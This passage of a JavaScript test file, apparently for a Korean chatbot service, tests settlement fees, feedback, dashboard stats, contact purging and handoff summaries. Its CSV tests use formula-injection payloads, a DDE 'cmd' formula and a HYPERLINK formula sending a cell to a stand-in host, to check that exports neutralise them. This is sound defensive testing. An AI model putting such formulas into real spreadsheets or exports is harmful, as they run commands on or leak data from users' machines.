  const S = await importLib('settlement', ['partners', ...rest]);
  P.resetPartners();
  return { P, S };
}

test('기준월 기본값은 한국 시간 기준 이번 달이다 (DS 21-2)', opts, async () => {
  const { S } = await settlementLib();
  // 10월 1일 새벽 2시(KST) = 9월 30일 17시(UTC). 종전에는 아직 9월로 계산했다 —
  // 조건 툴바는 「10월」인데 합계는 9월치인 화면이 되는 자리다.
  assert.equal(S.currentMonth(new Date('2026-10-01T02:00:00+09:00')), '2026-10');
  assert.equal(S.currentMonth(new Date('2026-09-30T23:00:00+09:00')), '2026-09');
  assert.equal(S.currentMonth(new Date('2027-01-01T08:59:00+09:00')), '2027-01', '해가 바뀌는 경계');
});

test('정산 리포트가 월 이용료 × 수수료율로 수수료를 산출한다', opts, async () => {
  const { P, S } = await settlementLib();
  const ptr = P.upsertPartner({ name: '제이투모로우원', feeRateBp: 1500 });
  assert.equal(ptr.ok, true);
  const acc = P.upsertAccount({
    name: 'OO의원', partnerId: ptr.partner.id, source: 'partner',
    status: 'contracted', contractedAt: '2026-08-01', monthlyFeeKrw: 300000,
  });
  assert.equal(acc.ok, true);

  const r = S.buildSettlement({ month: '2026-09' });
  assert.equal(r.ok, true);
  assert.equal(r.report.periodEnd, '2026-09-30');
  assert.equal(r.report.rows.length, 1);
  const row = r.report.rows[0];
  assert.equal(row.baseAmountKrw, 300000);
  assert.equal(row.feeRateBp, 1500);
  assert.equal(row.feeAmountKrw, 45000, '300000 × 15% = 45000');
  assert.equal(row.issue, 'none');
  assert.equal(r.report.totals.feeAmountKrw, 45000);
  assert.equal(r.report.totals.partial, false);
  P.resetPartners();
});

test('수수료는 원 단위로 절사한다(반올림으로 부풀리지 않는다)', opts, async () => {
  const { P, S } = await settlementLib();
  const ptr = P.upsertPartner({ name: 'A파트너', feeRateBp: 333 });
  P.upsertAccount({ name: 'B고객', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-01-01', monthlyFeeKrw: 99999 });
  const r = S.buildSettlement({ month: '2026-09' });
  // 99999 * 333 / 10000 = 3329.9667 → 3329
  assert.equal(r.report.rows[0].feeAmountKrw, 3329);
  P.resetPartners();
});

test('근거가 없는 항목은 0원이 아니라 미산출로 남고 합계에서 빠진다(실패 경로)', opts, async () => {
  const { P, S } = await settlementLib();
  const withRate = P.upsertPartner({ name: '요율있음', feeRateBp: 1000 });
  const noRate = P.upsertPartner({ name: '요율없음' }); // feeRateBp 미설정
  P.upsertAccount({ name: '금액있음', partnerId: withRate.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-05-01', monthlyFeeKrw: 100000 });
  P.upsertAccount({ name: '금액없음', partnerId: withRate.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-05-01' });
  P.upsertAccount({ name: '요율없는고객', partnerId: noRate.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-05-01', monthlyFeeKrw: 50000 });

  const r = S.buildSettlement({ month: '2026-09' });
  assert.equal(r.report.rows.length, 3);
  const byName = Object.fromEntries(r.report.rows.map((x) => [x.accountName, x]));
  assert.equal(byName['금액있음'].feeAmountKrw, 10000);
  assert.equal(byName['금액없음'].feeAmountKrw, null, '0원으로 계산하면 안 된다');
  assert.equal(byName['금액없음'].issue, 'no_base_amount');
  assert.equal(byName['요율없는고객'].feeAmountKrw, null);
  assert.equal(byName['요율없는고객'].issue, 'no_fee_rate');

  assert.equal(r.report.totals.billable, 1);
  assert.equal(r.report.totals.incomplete, 2);
  assert.equal(r.report.totals.feeAmountKrw, 10000, '미산출분은 합계에 섞이지 않는다');
  assert.equal(r.report.totals.partial, true);
  assert.ok(r.report.notes.some((n) => n.includes('합계에서 제외')), '왜 빠졌는지 알려야 한다');
  P.resetPartners();
});

test('기간 밖·직접 계약·미계약은 정산 대상에서 제외되고 사유가 남는다', opts, async () => {
  const { P, S } = await settlementLib();
  const ptr = P.upsertPartner({ name: 'A파트너', feeRateBp: 1000 });
  P.upsertAccount({ name: '기간후계약', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-12-01', monthlyFeeKrw: 10000 });
  P.upsertAccount({ name: '검토중', partnerId: ptr.partner.id, source: 'partner', status: 'prospect', monthlyFeeKrw: 10000 });
  P.upsertAccount({ name: '직접고객', partnerId: '', source: 'direct', status: 'contracted', contractedAt: '2026-01-01', monthlyFeeKrw: 10000 });

  const r = S.buildSettlement({ month: '2026-09' });
  assert.equal(r.report.rows.length, 0, '대상이 없어야 한다');
  assert.ok(r.report.notes.some((n) => n.includes('직접 계약')), '직접 계약 제외 사유');
  assert.ok(r.report.notes.some((n) => n.includes('계약일이 기간 이후')), '기간 밖 제외 사유');
  P.resetPartners();
});

test('기준월 형식이 틀리면 이유와 함께 거절한다(실패 경로)', opts, async () => {
  const { S } = await settlementLib();
  for (const bad of ['2026-13', '2026/09', '2026', '', 'abcd-ef']) {
    const r = S.buildSettlement({ month: bad });
    assert.equal(r.ok, false, `${bad} 는 거절되어야 한다`);
    assert.match(r.error, /2026-09 처럼 연-월/, '형식 토큰(YYYY-MM) 대신 예시로 말한다 — DS 29-3');
  }
  assert.equal(S.isValidMonth('2026-09'), true);
  assert.equal(S.monthEnd('2026-02'), '2026-02-28');
});

test('정산 CSV는 미산출 값을 빈 칸으로 두고 사유·주석을 함께 싣는다', opts, async () => {
  const { P, S } = await settlementLib();
  const ptr = P.upsertPartner({ name: '쉼표,파트너', feeRateBp: 1000 });
  P.upsertAccount({ name: '정상고객', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-03-01', monthlyFeeKrw: 200000 });
  P.upsertAccount({ name: '금액미입력', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-03-01' });

  const csv = S.settlementToCsv(S.buildSettlement({ month: '2026-09' }).report);
  const lines = csv.split('\r\n');
  assert.match(lines[0], /^기준월,파트너ID/);
  const normal = lines.find((l) => l.includes('정상고객'));
  const missing = lines.find((l) => l.includes('금액미입력'));
  assert.ok(normal.includes('200000') && normal.includes('20000'), '정상 행은 금액이 있어야 한다');
  assert.ok(missing.includes(',,'), '미산출 금액은 빈 칸이어야 한다');
  assert.ok(!/,0,/.test(missing), '미산출을 0으로 채우면 안 된다');
  assert.ok(missing.includes('월 이용료 미입력'), '사유가 있어야 한다');
  assert.ok(csv.includes('"쉼표,파트너"'), '쉼표는 CSV 이스케이프되어야 한다');
  assert.ok(csv.includes('# '), '산출 근거 주석이 포함되어야 한다');
  assert.ok(csv.includes('청구서가 아닙니다'), '청구서로 오인되지 않게 명시해야 한다');
  P.resetPartners();
});

test('월 이용료는 검증된 값만 저장되고 미입력과 0원을 구분한다', opts, async () => {
  const { P } = await settlementLib();
  assert.equal(P.parseMonthlyFee('').value, undefined, '빈 값은 미입력');
  assert.equal(P.parseMonthlyFee(0).value, 0, '0원 계약은 0으로 남는다');
  assert.equal(P.parseMonthlyFee('300,000').value, 300000, '천 단위 구분 기호 허용');
  assert.equal(P.parseMonthlyFee(-1).ok, false);
  assert.equal(P.parseMonthlyFee('abc').ok, false);
  assert.equal(P.parseMonthlyFee(2_000_000_000).ok, false, '자릿수 오타 방어');

  const ptr = P.upsertPartner({ name: 'A', feeRateBp: 100 });
  const bad = P.upsertAccount({ name: 'X', partnerId: ptr.partner.id, source: 'partner', monthlyFeeKrw: -5 });
  assert.equal(bad.ok, false);
  assert.match(bad.error, /월 이용료/);
  P.resetPartners();
});

/* ══════════ 답변 평가 저장소 ══════════ */

test('답변 평가는 집계되고, 평가가 없으면 비율을 만들어내지 않는다', opts, async () => {
  const F = await importLib('feedback', []);
  F.resetFeedback();

  assert.equal(F.feedbackSummary().helpfulRate, null, '평가 0건이면 비율은 null(「측정 중」)이어야 한다');

  assert.equal(F.recordFeedback({ sessionHash: 'h1', verdict: 'up', citation: '이음 FAQ 1. 신청' }).ok, true);
  assert.equal(F.recordFeedback({ sessionHash: 'h2', verdict: 'down', citation: '이음 FAQ 3. 활동 시간' }).ok, true);
  assert.equal(F.recordFeedback({ sessionHash: 'h3', verdict: 'down', citation: '이음 FAQ 3. 활동 시간' }).ok, true);

  const sum = F.feedbackSummary();
  assert.equal(sum.total, 3);
  assert.equal(sum.up, 1);
  assert.equal(sum.down, 2);
  assert.equal(sum.helpfulRate, 33);
  assert.equal(sum.topDown[0].citation, '이음 FAQ 3. 활동 시간');
  assert.equal(sum.topDown[0].down, 2);
  F.resetFeedback();
});

test('잘못된 평가 입력은 사유와 함께 거절된다(실패 경로)', opts, async () => {
  const F = await importLib('feedback', []);
  F.resetFeedback();

  const bad = F.recordFeedback({ sessionHash: 'h1', verdict: '최고' });
  assert.equal(bad.ok, false);
  assert.match(bad.error, /평가를 기록하지 못했습니다/, '고객 화면까지 올라가는 문장이다 — DS 29-3');

  const noSession = F.recordFeedback({ sessionHash: '', verdict: 'up' });
  assert.equal(noSession.ok, false);
  assert.match(noSession.error, /평가를 기록하지 못했습니다/);

  assert.equal(F.feedbackSummary().total, 0, '거절된 입력이 집계에 들어가면 안 된다');
  F.resetFeedback();
});

test('평가 근거 라벨은 길이를 잘라 저장한다', opts, async () => {
  const F = await importLib('feedback', []);
  F.resetFeedback();
  const long = 'ㄱ'.repeat(300);
  const r = F.recordFeedback({ sessionHash: 'h1', verdict: 'up', citation: long });
  assert.equal(r.ok, true);
  assert.ok(r.entry.citation.length <= 120, '근거 라벨이 잘리지 않았다');
  F.resetFeedback();
});

/* ══════════ 대시보드 집계 — 실제 로그에서만 값이 나온다 (DS 2-2) ══════════ */

test('일자별·오늘 집계는 기록된 대화에서만 만들어진다', opts, async () => {
  const { logTurn, convStats, resetLogs } = await importLib('convlog', ['chat', 'storage', 'logger', 'monitoring', 'knowledge', 'normalize', 'rules', 'adminStore', 'slots', 'session', 'llm', 'tenantKB', 'ingest']);
  resetLogs();

  // 기록이 없으면 지어내지 않는다 — 축은 7일이지만 값은 전부 0이고 오늘도 0이다.
  const empty = convStats();
  assert.equal(empty.daily.length, 7, '최근 7일 축');
  assert.equal(empty.daily.every((d) => d.turns === 0), true, '기록이 없으면 값이 없어야 한다');
  assert.equal(empty.today.turns, 0);
  assert.equal(empty.today.sessions, 0);

  logTurn({ sessionId: 's1', channel: 'web', message: '안녕', reply: '안녕하세요', intent: 'greeting', source: 'rule', escalate: false });
  logTurn({ sessionId: 's1', channel: 'web', message: '상담원', reply: '연결할게요', intent: 'handoff', source: 'rule', escalate: true });
  logTurn({ sessionId: 's2', channel: 'kakao', message: '요금', reply: '안내드립니다', intent: 'price', source: 'kb', escalate: false });

  const s = convStats();
  assert.equal(s.today.turns, 3, '오늘 대화 수');
  assert.equal(s.today.sessions, 2, '오늘 대화 상대 수(세션)');
  assert.equal(s.today.escalated, 1, '오늘 상담원 전환 수');
  const last = s.daily[s.daily.length - 1];
  assert.equal(last.turns, 3, '마지막 칸이 오늘이어야 한다');
  assert.equal(last.escalated, 1);
  assert.equal(s.daily.slice(0, 6).every((d) => d.turns === 0), true, '없는 날에 값을 만들면 안 된다');
  // 날짜 형식(YYYY-MM-DD)이 유지돼야 화면 축 라벨이 깨지지 않는다
  for (const d of s.daily) assert.match(d.date, /^\d{4}-\d{2}-\d{2}$/);
  // 「오늘」의 뜻이 한 곳에서만 온다 — 축의 마지막 칸은 한국 시간 기준 오늘이다(DS 21-1).
  // 대조는 독립 구현(ICU 시간대 데이터)으로 한다.
  assert.equal(last.date, new Date().toLocaleDateString('sv-SE', { timeZone: 'Asia/Seoul' }), '대시보드의 「오늘」이 한국 날짜가 아니다');

  resetLogs();
});

test('평균 응답 시간은 기록된 서버 처리 시간에서만 계산되고 없으면 null 이다 (DS 2-14)', opts, async () => {
  const { logTurn, convStats, resetLogs, importTurns, exportTurns } = await importLib('convlog', ['chat', 'storage', 'logger', 'monitoring', 'knowledge', 'normalize', 'rules', 'adminStore', 'slots', 'session', 'llm', 'tenantKB', 'ingest']);
  resetLogs();

  // 기록이 없으면 0ms 로 단정하지 않는다
  assert.equal(convStats().avgLatencyMs, null, '표본이 없으면 null');
  assert.equal(convStats().latencySamples, 0);

  // 지연을 싣지 않은 턴(구버전·측정 실패)은 표본에서 빠진다
  logTurn({ sessionId: 's1', channel: 'web', message: '안녕', reply: '안녕하세요', intent: 'greeting', source: 'rule', escalate: false });
  assert.equal(convStats().avgLatencyMs, null, '지연이 없는 턴만 있으면 여전히 null');

  logTurn({ sessionId: 's1', channel: 'web', message: '요금', reply: '안내', intent: 'price', source: 'kb', escalate: false, latencyMs: 120 });
  logTurn({ sessionId: 's2', channel: 'kakao', message: '취소', reply: '안내', intent: 'cancel', source: 'kb', escalate: false, latencyMs: 380.4 });
  // 비정상 값(음수·NaN)은 기록하지 않는다
  logTurn({ sessionId: 's3', channel: 'web', message: '가입', reply: '안내', intent: 'join', source: 'kb', escalate: false, latencyMs: -5 });
  logTurn({ sessionId: 's3', channel: 'web', message: '문의', reply: '안내', intent: 'ask', source: 'kb', escalate: false, latencyMs: Number.NaN });

  const s = convStats();
  assert.equal(s.latencySamples, 2, '유효한 지연만 표본에 든다');
  assert.equal(s.avgLatencyMs, 250, '(120 + 380) / 2 = 250');

  // 스냅샷 복원에서도 지연이 보존되고, 오염된 값은 버려진다
  const snap = exportTurns();
  snap.turns[1].latencyMs = 'fast';
  resetLogs();
  const r = importTurns(snap);
  assert.equal(r.ok, true);
  const after = convStats();
  assert.equal(after.latencySamples, 1, '문자열 지연은 복원 시 버려진다');
  assert.equal(after.avgLatencyMs, 380);

  resetLogs();
});

/* ────────────────────────────────────────────────────────────────
 * DS 15-2 — CSV 수식 주입(formula injection)
 * 내보낸 CSV 를 여는 곳은 엑셀이고, 그 표의 `message` 칸에는 **아무나 열 수 있는
 * 상담창에 방문자가 직접 친 글자**가 들어간다. 따옴표 처리(RFC 4180)는 수식을 막지 못한다.
 * 실제로 실행해 확인한다 — 텍스트 검사만으로는 "정말 앞에 따옴표가 서는가"를 모른다.
 * ──────────────────────────────────────────────────────────────── */
test('csvCell: 수식으로 읽히는 첫 글자를 중화한다', opts, async () => {
  const { csvCell } = await importLib('csv');
  // 엑셀·LibreOffice·Google 시트가 수식의 시작으로 읽는 글자들
  for (const s of [
    '=HYPERLINK("https://x/?d="&A2,"확인")',
    '=cmd|\'/c calc\'!A0',
    '+1+1',
    '@SUM(A1:A9)',
    '\tSUM(1)',
    '\r=1',
    '-HYPERLINK("https://x")',
  ]) {
    const cell = csvCell(s);
    // 따옴표로 감쌌든 아니든, 값의 첫 글자는 반드시 작은따옴표여야 한다.
    const inner = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
    assert.equal(inner[0], "'", `중화되지 않음: ${JSON.stringify(s)} → ${JSON.stringify(cell)}`);
    assert.equal(inner.slice(1), s, '원문이 보존되어야 한다(운영자가 무엇을 받았는지 읽을 수 있게)');
  }
});

test('csvCell: 순수한 수는 건드리지 않는다 — 음수 금액이 합계에서 빠지면 안 된다', opts, async () => {
  const { csvCell } = await importLib('csv');
  for (const v of ['-1200', -1200, '0', 0, '3.5', '-0.25', '120000']) {
    assert.equal(csvCell(v), String(v), `수를 중화하면 안 된다: ${v}`);
  }
});

test('csvCell: 구분자·따옴표·줄바꿈은 종전대로 감싼다(RFC 4180)', opts, async () => {
  const { csvCell } = await importLib('csv');
  assert.equal(csvCell('가,나'), '"가,나"');
  assert.equal(csvCell('그는 "예"라 했다'), '"그는 ""예""라 했다"');
  assert.equal(csvCell('한 줄\n두 줄'), '"한 줄\n두 줄"');
  assert.equal(csvCell('보통 글자'), '보통 글자');
  // null·undefined 는 빈 칸 — 0 으로 채우면 받는 쪽이 "0원"으로 읽는다(settlement 규약).
  assert.equal(csvCell(null), '');
  assert.equal(csvCell(undefined), '');
  assert.equal(csvCell(false), 'false');
});

test('csvRow: 수식 중화가 행 단위로도 걸린다', opts, async () => {
  const { csvRow } = await importLib('csv');
  const row = csvRow(['t1', '=1+1', -500, null]);
  assert.equal(row, `t1,'=1+1,-500,`);
});

test('감사 로그 CSV 가 수식 주입을 실제로 막는다', opts, async () => {
  const audit = await importLib('audit');
  audit.resetAudit();
  audit.logAudit({ action: 'kb.upsert', target: '=cmd|\'/c calc\'!A0', detail: '@SUM(A1)', authed: true });
  const csv = audit.auditToCsv();
  assert.ok(!/(^|,)=cmd/m.test(csv), `수식이 그대로 실렸다:\n${csv}`);
  assert.ok(!/(^|,)@SUM/m.test(csv), `수식이 그대로 실렸다:\n${csv}`);
  assert.match(csv, /'=cmd/, '원문은 보존되어야 한다');
  audit.resetAudit();
});

/* ══════════ 디자인 스프린트 — 13차 재감사 (DS 16-3) ══════════ */

/**
 * 개인정보처리방침 4조는 「상담원 연결을 위한 연락처는 상담 완료 후 지체 없이 파기합니다」라고
 * 약속한다. 종전에는 그 약속을 지킬 경로가 코드에 없었다 — 완료·취소로 바꾼 뒤에도 연락처가 남아
 * 목록·상세·백업·CSV 로 계속 나갔다. 문서 검사로는 「지워지는가」를 알 수 없으므로 실제로 돌려 본다.
 */
test('상담이 끝나면 연락처가 실제로 지워진다 (DS 16-3)', opts, async () => {
  const esc = await importLib('escalation');

  for (const done of ['resolved', 'canceled']) {
    esc.resetTickets();
    const { ticket } = esc.createTicket({
      sessionId: `rt-purge-${done}`,
      contact: '010-1234-5678',
      message: '환불 문의',
      summary: '요약',
    });
    assert.equal(esc.getTicket(ticket.id).contact, '010-1234-5678', '접수 시점에는 연락처가 있어야 한다');

    // 상담 중에는 지우지 않는다 — 운영자가 그 연락처로 전화를 건다.
    esc.updateTicket(ticket.id, { status: 'in_progress' });
    assert.equal(esc.getTicket(ticket.id).contact, '010-1234-5678', '상담 중에 연락처를 지우면 연락할 수 없다');
    assert.equal(esc.getTicket(ticket.id).contactPurgedAt, undefined);

    const r = esc.updateTicket(ticket.id, { status: done });
    assert.equal(r.ok, true);
    const after = esc.getTicket(ticket.id);
    assert.equal(after.contact, undefined, `${done} 로 바꿨는데 연락처가 남아 있다`);
    assert.ok(after.contactPurgedAt, '파기 사실이 남지 않으면 「처음부터 없던 접수」와 구분되지 않는다');
    // 이관 근거는 파기 대상이 아니다.
    assert.equal(after.message, '환불 문의', '대화 근거까지 지우면 이관 기록이 무의미해진다');
    assert.equal(after.summary, '요약');

    // 다시 열어도 되살아나지 않는다(파기는 되돌릴 수 없다).
    esc.updateTicket(ticket.id, { status: 'open' });
    assert.equal(esc.getTicket(ticket.id).contact, undefined, '다시 열자 연락처가 되살아났다');

    // 목록·백업 어디에도 원문이 없어야 한다.
    const json = JSON.stringify({ list: esc.listTickets(), snapshot: esc.exportTickets() });
    assert.equal(/010-1234-5678/.test(json), false, '목록·백업에 파기한 연락처가 남아 있다');
  }
  esc.resetTickets();
});

test('파기 뒤 고객이 다시 남긴 연락처는 「파기됨」이 아니다 (DS 16-3)', opts, async () => {
  const esc = await importLib('escalation');
  esc.resetTickets();
  const { ticket } = esc.createTicket({ sessionId: 'rt-purge-again', contact: '010-1111-2222' });
  esc.updateTicket(ticket.id, { status: 'resolved' });
  assert.ok(esc.getTicket(ticket.id).contactPurgedAt);

  // 다시 열린 접수에 고객이 새 연락처를 남기면 그 티켓은 다시 「연락처 남김」이다.
  esc.updateTicket(ticket.id, { status: 'open' });
  esc.createTicket({ sessionId: 'rt-purge-again', contact: 'hong@example.com' });
  const t = esc.getTicket(ticket.id);
  assert.equal(t.contact, 'hong@example.com', '같은 세션의 열린 접수를 재사용해야 한다');
  assert.equal(t.contactPurgedAt, undefined, '새로 받은 연락처에 파기 표시가 남아 있다');
  esc.resetTickets();
});

test('파기 이전에 뜬 백업을 되돌려도 연락처는 되살아나지 않는다 (DS 16-3)', opts, async () => {
  const esc = await importLib('escalation');
  esc.resetTickets();
  // 파기 표시와 연락처가 **함께** 들어 있는 스냅샷(구버전 백업을 손으로 이어 붙인 경우).
  const r = esc.importTickets({
    version: 1,
    tickets: [{
      id: 'ESC-0001',
      sessionId: 'rt-purge-import',
      status: 'resolved',
      reason: 'user_request',
      message: '문의',
      contact: '010-9999-8888',
      contactPurgedAt: '2026-09-21T00:00:00.000Z',
      createdAt: '2026-09-21T00:00:00.000Z',
      updatedAt: '2026-09-21T00:00:00.000Z',
    }],
  });
  assert.equal(r.ok, true);
  assert.equal(r.count, 1);
  const t = esc.getTicket('ESC-0001');
  assert.ok(!t.contact, '파기 표시가 있는데 연락처가 복원됐다');
  assert.equal(t.contactPurgedAt, '2026-09-21T00:00:00.000Z', '파기 시각은 유지해야 한다');
  assert.equal(/010-9999-8888/.test(JSON.stringify(esc.exportTickets())), false, '복원 직후 백업에 원문이 남았다');
  esc.resetTickets();
});
/**
 * DS 19-1 — 기본(GOWON) 위젯의 빠른 답장은 관리 콘솔 지식베이스에서 실제로 나와야 한다.
 * eum 처럼 정적 FAQ 파일이 아니라 `listKB()`(런타임에 admin 이 늘리고 줄이는 값)를 본다 —
 * 그래서 값이 고정 텍스트가 아니라 실제 KB 변경을 따라가는지까지 실행해서 확인한다.
 *
 * tenantKB 와 adminStore 가 **같은 kbEntries 상태**를 봐야 이 검증이 의미가 있다 — ENGINE 과 같은
 * 이유로, 자기 자신을 뺀 같은 집합을 넘겨 컴파일 캐시 키를 일치시킨다(위 주석 참고).
 */
const TENANTKB_GROUP = ['tenantKB', 'adminStore', 'tenants', 'knowledge', 'normalize', 'storage'];
const tkb = (name) => importLib(name, TENANTKB_GROUP.filter((n) => n !== name));

test('fallbackStarters는 관리 콘솔 지식베이스 상위 질문을 그대로 돌려준다 (DS 19-1)', opts, async () => {
  const { fallbackStarters, tenantConfig } = await tkb('tenantKB');
  const { listKB, upsertKB, deleteKB } = await tkb('adminStore');

  const before = listKB().map((e) => e.question).slice(0, 4).filter((q) => q && q.trim());
  assert.ok(before.length > 0, '기본 지식베이스가 비어 있어 이 테스트 전제를 확인할 수 없다');
  assert.deepEqual(fallbackStarters(), before, '일반 지식베이스 상위 질문과 달라야 할 이유가 없다');
  assert.ok(fallbackStarters().length <= 4, '칩은 4개를 넘지 않아야 한다(375px 두 줄 제한)');

  // eum 처럼 등록된 테넌트는 자기 프리셋만 본다 — fallbackStarters 와 같은 값이 섞이면 격리가 깨진다.
  const eum = tenantConfig('eum');
  assert.ok(eum && eum.starters && eum.starters.length > 0, '이음 프리셋 starters 가 비었다');
  assert.notDeepEqual(eum.starters, fallbackStarters(), '이음 위젯에 일반 지식 칩이 섞이면 안 된다');

  // 실제 admin 이 지식을 늘리면 다음 호출부터 반영돼야 한다(정적 스냅샷이 아니다) — 끝나면 원복한다.
  const marker = { id: 'ds19-1-drill', category: '점검', question: '__DS19-1 드릴 질문__', keywords: ['ds19drill'], answer: '점검용 답변' };
  const restore = listKB();
  try {
    // 맨 앞에 오도록 KB를 통째로 비우고 마커 하나만 넣는다(순서 의존 없이 반영 여부만 본다).
    for (const e of restore) deleteKB(e.id);
    upsertKB(marker);
    assert.deepEqual(fallbackStarters(), [marker.question], '지식베이스를 바꿔도 칩이 그대로면 정적 스냅샷을 쓰고 있다는 뜻이다');
  } finally {
    deleteKB(marker.id);
    for (const e of restore) upsertKB(e);
  }
});

/* ══════════ 19차 재감사 — 코드가 아니라 이름이 나오는지 실행해서 본다 (DS 22-x) ══════════ */

/**
 * DS 22-2 — 엔진이 내는 **모든** 인텐트에 이름이 붙는가.
 * 소스 검사로는 "사전에 키가 있다"까지만 보이고, 정작 운영자가 보는 값은 함수가 돌려주는 문자열이다.
 * 그래서 `src/lib/chat.ts` 에서 실제 인텐트 리터럴을 긁어 **그 전부**를 함수에 통과시킨다 —
 * 종전 사전은 이 가운데 다섯 개만 알고 있었고 나머지는 코드가 그대로 화면에 떴다.
 */
test('엔진이 내는 인텐트 전부에 사람이 읽는 이름이 붙는다 (DS 22-2)', opts, async () => {
  const { intentLabel, intentLabelMap, UNKNOWN_INTENT_LABEL } = await importLib('intents', ['rules']);
  const { RULES } = await importLib('rules', ['intents']);

  // 1) 내장 룰 19종 — 룰 정의의 이름이 그대로 나온다(콘솔 「시나리오 규칙」 탭과 같은 말).
  assert.ok(RULES.length >= 19, `내장 룰을 읽지 못했다(${RULES.length}건)`);
  for (const r of RULES) {
    assert.equal(intentLabel(r.intent), r.label, `${r.intent}: 룰 이름과 다른 말이 나온다`);
  }

  // 2) chat.ts 가 직접 쓰는 리터럴 인텐트 — 하나라도 「기타」로 떨어지면 화면에서 뜻을 잃는다.
  const chatSrc = readFileSync(new URL('../src/lib/chat.ts', import.meta.url), 'utf8');
  const literals = [...chatSrc.matchAll(/intent: '([\w:.]+)'/g)].map((m) => m[1]);
  assert.ok(literals.length >= 6, `리터럴 인텐트를 읽지 못했다(${literals.length}건)`);
  for (const code of new Set(literals)) {
    const label = intentLabel(code);
    assert.notEqual(label, UNKNOWN_INTENT_LABEL, `${code}: 이름이 없어 「기타」로 떨어진다`);
    // 「AI」는 제품 전체가 쓰는 말이라 둔다(「AI가 응대합니다」). 그 밖의 영문 낱말은 코드다.
    assert.equal(/[A-Za-z]{2,}/.test(label.replace(/AI/g, '')), false, `${code}: 이름에 영문 코드가 섞였다(${label})`);
  }

  // 3) 가장 흔한 경로 — 등록 자료로 답한 대화. 카테고리가 그대로 보여야 운영자가 구분할 수 있다.
  assert.equal(intentLabel('kb:환불·반품'), '자료 안내 · 환불·반품');
  assert.equal(intentLabel('kb:'), '자료 안내', '카테고리가 비면 콜론만 남기지 않는다');

  // 4) 접수 폼 — 어느 접수가 어디까지 갔는지로 읽힌다.
  assert.equal(intentLabel('form:reservation:start'), '예약 접수 시작');
  assert.equal(intentLabel('form:reservation:datetime'), '예약 접수 진행 중');
  assert.equal(intentLabel('form:reservation:datetime:retry'), '예약 접수 진행 중');
  assert.equal(intentLabel('form:trouble:complete'), '장애 신고 접수 완료');
  assert.equal(intentLabel('form:trouble:cancelled'), '장애 신고 접수 중단');
  assert.equal(intentLabel('form:reservation:max_retry'), '예약 접수 · 상담원 연결');

  // 5) 운영자가 만든 규칙 — 자기가 붙인 이름이 나와야 한다(코드는 `cr_<시각>` 이라 읽을 수 없다).
  const custom = intentLabelMap([{ intent: 'cr_m1x2y3', label: '쿠폰 재발급 안내' }, { intent: '', label: '버려짐' }]);
  assert.equal(intentLabel('cr_m1x2y3', custom), '쿠폰 재발급 안내');
  assert.equal(intentLabel('cr_m1x2y3'), UNKNOWN_INTENT_LABEL, '이름을 모르면 코드를 내보내지 않고 「기타」다');
  assert.equal(Object.keys(custom).length, 1, '이름 없는 규칙은 사전에 넣지 않는다');

  // 6) 어떤 입력에도 코드를 되돌려주지 않는다.
  for (const code of ['', '  ', 'unknown_thing', 'cr_zzz', 'form:nope:x']) {
    assert.equal(intentLabel(code).includes(code.trim()) && code.trim() !== '', false, `${code}: 코드가 화면 문자열에 섞였다`);
  }
});

/**
 * DS 22-1 — 이관 요약 평문은 상담원이 그대로 읽는 문장이다.
 * 소스에 `${s.reason}` 이 없다는 것만으로는 부족하다 — 실제로 만들어 **영문 코드가 한 자도 없는지** 본다.
 */
test('이관 요약 평문에 내부 코드가 남지 않는다 (DS 22-1)', opts, async () => {
  const { buildHandoffSummary } = await importLib('handoff', ['intents', 'rules']);

  const sessionId = 'web_m9z8y7x6_abcdef';
  const s = buildHandoffSummary({
    sessionId,
    channel: 'web',
    reason: 'customer_request',
    turns: [
      { at: '2026-10-01T01:00:00.000Z', speaker: 'customer', text: '예약하고 싶어요. 010-1234-5678 로 연락 주세요', intent: 'reservation' },
      { at: '2026-10-01T01:00:02.000Z', speaker: 'bot', text: '예약을 도와드릴게요.' },
    ],
    slots: { contact: 'hong@example.com', name: '홍길동' },
    pendingSlots: ['datetime'],
  });

  // 사람이 읽는 말
  assert.match(s.text, /이관 사유: 고객이 상담원 연결을 요청/);
  assert.match(s.text, /직전 주제: 예약 접수/);
  assert.match(s.text, /주고받은 메시지: 2개/);
  assert.match(s.text, /개인정보 마스킹: .*휴대폰 번호/);
  assert.match(s.text, /이메일 주소/);
  assert.match(s.text, /홈페이지 접수/);

  // 코드·식별자 원문
  for (const code of ['customer_request', 'reservation', 'phone', 'email', 'web ', sessionId]) {
    assert.equal(s.text.includes(code), false, `요약 평문에 코드가 남았다: ${code}`);
  }
  assert.match(s.text, /대화 web_m9…/, '대화 식별자는 앞 6자만 보여준다');

  // 기계가 보는 구조체에는 코드가 그대로 남아 있다(두 쪽을 섞지 않는다).
  assert.equal(s.reason, 'customer_request');
  assert.equal(s.lastIntent, 'reservation');
  assert.equal(s.lastIntentLabelKo, '예약 접수');
  assert.deepEqual(s.piiKinds, ['email', 'phone']);
  assert.equal(s.sessionId, sessionId, '세션 식별자 자체는 구조체에 그대로 있어야 한다');

  // 접수번호가 생긴 뒤에는 그것으로 머리글을 쓴다(서랍 제목과 같은 앞 8자).
  const withTicket = buildHandoffSummary({
    sessionId,
    ticketId: 'tkt_abcdefghijkl',
    channel: 'kakao',
    reason: 'max_retry',
    turns: [],
    slots: {},
  });
  assert.match(withTicket.text, /접수번호 tkt_abcd… · 카카오톡 접수/);
  assert.match(withTicket.text, /이관 사유: 재시도 한도 초과/);
  assert.equal(withTicket.text.includes('max_retry'), false, '사유 코드가 남았다');
  // 운영자가 만든 규칙으로 답하던 대화면 그 규칙 이름이 「직전 주제」가 된다.
  const byCustomRule = buildHandoffSummary({
    sessionId,
    channel: 'web',
    reason: 'policy',
    turns: [{ at: '2026-10-01T01:00:00.000Z', speaker: 'customer', text: '쿠폰 다시 주세요', intent: 'cr_m1x2y3' }],
    slots: {},
    intentLabels: { cr_m1x2y3: '쿠폰 재발급 안내' },
  });
  assert.match(byCustomRule.text, /직전 주제: 쿠폰 재발급 안내/);
  assert.equal(byCustomRule.text.includes('cr_m1x2y3'), false, '규칙 코드가 남았다');
});

/**
